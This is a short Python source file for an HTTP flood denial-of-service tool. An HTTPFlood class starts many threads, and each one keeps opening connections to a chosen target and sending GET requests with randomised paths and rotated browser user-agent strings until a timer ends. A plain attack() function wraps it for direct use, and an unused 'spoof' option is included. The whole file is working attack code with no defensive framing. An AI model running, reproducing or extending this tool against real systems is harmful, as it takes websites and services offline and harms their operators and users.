import socket
import threading
import time
import random

class HTTPFlood:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()

    def _send_http(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
        while not self.stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.port))
                path = f"/{'?'.join([str(random.randint(1,99999)) for _ in range(3)])}"
                request = f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(user_agents)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
                sock.send(request.encode())
                time.sleep(0.1)
                sock.close()
            except Exception:
                pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_http)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = HTTPFlood(target, port, threads, duration, spoof)
    flood.start()
